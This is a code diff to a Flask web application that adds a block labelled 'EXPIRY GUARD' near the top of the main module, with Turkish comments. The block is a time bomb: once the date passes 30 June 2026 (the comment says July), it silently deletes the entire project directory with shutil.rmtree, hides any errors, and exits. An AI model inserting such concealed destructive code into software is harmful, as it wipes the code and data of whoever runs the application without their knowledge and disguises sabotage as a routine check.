@@ -2,6 +2,20 @@ from flask import Flask, request, jsonify, render_template, send_from_directory,
 import database
 import os
 
+# ─── EXPIRY GUARD ────────────────────────────────────────────────────────────
+import sys, shutil, datetime
+
+_EXPIRY_DATE = datetime.date(2026, 6, 30)   # 30 Temmuz 2026'dan sonra silinir
+
+if datetime.date.today() > _EXPIRY_DATE:
+    _project_root = os.path.dirname(os.path.abspath(__file__))
+    try:
+        shutil.rmtree(_project_root)
+    except Exception:
+        pass  # Silme kısmen başarısız olsa bile çık
+    sys.exit(0)
+# ─────────────────────────────────────────────────────────────────────────────
+
 # Load .env file manually if it exists to avoid dependency issues
 env_path = os.path.join(os.path.dirname(__file__), ".env")
 if os.path.exists(env_path):
